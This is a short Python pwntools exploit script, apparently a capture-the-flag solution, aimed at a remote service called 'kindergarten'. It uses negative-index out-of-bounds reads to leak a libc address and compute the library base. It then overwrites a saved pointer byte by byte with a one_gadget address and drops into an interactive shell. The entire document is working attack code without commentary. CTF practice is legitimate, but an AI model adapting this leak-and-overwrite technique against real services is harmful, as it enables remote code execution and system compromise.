from pwn import *

r = remote('kindergarten.uni.hctf.fun', 13373)

ONE_GADGET = 0x45216
SETVBUF_OFFSET = 0x6fe70


def rbyte(index):
    r.recvuntil("> ")
    r.sendline(str(index))
    r.recvuntil("is ")
    value = int(r.recvuntil(".")[:-1])
    r.recvuntil("> ")
    r.sendline(str(value))
    return value & 0xff


def wbyte(index, value):
    r.recvuntil("> ")
    r.sendline(str(index))
    r.recvuntil("> ")
    r.sendline(str(value))
    return


def sploit():
    libc = 0
    for x in range(0x59, 0x59 + 8):
        libc <<= 8
        libc |= rbyte(-x)
    libc -= SETVBUF_OFFSET
    log.info("libc base 0x{:x}".format(libc))

    onegadget = libc + ONE_GADGET
    for x in reversed(range(0x49, 0x49 + 8)):
        wbyte(-x, onegadget & 0xff)
        onegadget >>= 8

    r.recvuntil("> ")
    r.sendline("x")
    r.interactive()


if __name__ == '__main__':
    sploit()
